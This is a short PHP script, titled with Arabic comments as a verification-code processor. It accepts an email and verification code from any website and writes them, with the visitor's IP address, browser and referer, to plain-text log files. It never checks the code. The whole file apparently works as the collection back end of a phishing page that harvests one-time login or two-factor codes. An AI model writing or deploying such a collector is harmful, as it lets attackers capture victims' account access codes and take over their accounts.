<?php
// process_verification.php - معالجة رمز التحقق
date_default_timezone_set('Asia/Riyadh');
header('Content-Type: text/html; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $verification_code = isset($_POST['verification_code']) ? trim($_POST['verification_code']) : '';
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $timestamp = isset($_POST['timestamp']) ? trim($_POST['timestamp']) : '';

    if ($verification_code && $email) {
        $file = 'verification_codes.txt';
        
        // جمع المعلومات
        $user_ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $current_time = date('Y-m-d H:i:s');
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';
        
        // تنسيق البيانات
        $data = "════════════════════════════════════════\n";
        $data .= "📧 البريد: $email\n";
        $data .= "🔢 رمز التحقق: $verification_code\n";
        $data .= "🕐 وقت الإدخال: $current_time\n";
        $data .= "🕐 الطابع الزمني: $timestamp\n";
        $data .= "🌐 IP: $user_ip\n";
        $data .= "🔍 المتصفح: $user_agent\n";
        $data .= "📎 المرجع: $referer\n";
        $data .= "════════════════════════════════════════\n\n";
        
        // حفظ البيانات
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
            // تسجيل إضافي
            $log_entry = "$current_time | EMAIL: $email | CODE: $verification_code | IP: $user_ip\n";
            file_put_contents('verification_log.txt', $log_entry, FILE_APPEND | LOCK_EX);
            
            echo "SUCCESS";
        } else {
            echo "ERROR_SAVING";
        }
        
    } else {
        http_response_code(400);
        echo "MISSING_DATA";
    }
} else {
    http_response_code(405);
    echo "METHOD_NOT_ALLOWED";
}
?>